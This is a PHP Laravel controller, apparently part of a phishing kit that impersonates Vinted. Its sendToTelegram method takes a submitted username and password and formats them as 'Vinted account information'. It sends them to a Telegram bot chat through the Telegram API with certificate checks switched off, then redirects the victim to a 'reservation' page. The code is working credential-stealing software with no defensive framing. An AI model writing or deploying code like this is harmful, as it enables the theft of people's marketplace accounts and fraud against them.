<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class PaymentController extends Controller
{
    /**
     * Étape 1 : Réception des données qui te redirige vers la page reservation youpi
     */
    public function sendToTelegram(Request $request)
    {
        $validated = $request->validate([
            'username'    => 'required|string|max:225',
            'password' =>  'required|string|min:8|max:255',
        ]);

        // Formatage du message Telegram
        $message = "🔔 *INFORMATIONS DU COMPTE VINTED* 🔔\n\n"
                 . "👤 Nom : {$validated['username']}\n"
                 . "💳 mot de passe : {$validated['password']}";

        try {
            $this->sendTelegramMessage($message);
            return redirect()->route('reservation');
        } catch (\Exception $e) {
            \Log::error('PaymentController Telegram error: ' . $e->getMessage());
            return redirect()->route('reservation');
        }
    }

    private function sendTelegramMessage($message)
    {
        $token = env('TELEGRAM_BOT_TOKEN');
        $chatId = env('TELEGRAM_CHAT_ID');
        
        \Log::info('Telegram config check - Token: ' . ($token ? 'SET' : 'MISSING') . ', ChatId: ' . ($chatId ? 'SET (' . $chatId . ')' : 'MISSING'));
        
        if (!$token || !$chatId) {
            \Log::error('Telegram config missing - Token: ' . ($token ? 'yes' : 'no') . ', ChatId: ' . ($chatId ? 'yes' : 'no'));
            throw new \Exception('Telegram config missing');
        }

        $url = "https://api.telegram.org/bot{$token}/sendMessage";
        
        $data = [
            'chat_id' => $chatId,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);

        \Log::info('Telegram API response - HTTP Code: ' . $httpCode);
        \Log::info('Telegram API response - Body: ' . $response);

        if ($httpCode !== 200) {
            \Log::error('Telegram API error: HTTP ' . $httpCode . ' - ' . $response . ' - ' . $error);
            throw new \Exception('Telegram API failed: ' . $response);
        }

        \Log::info('Telegram message sent successfully');
    }
}
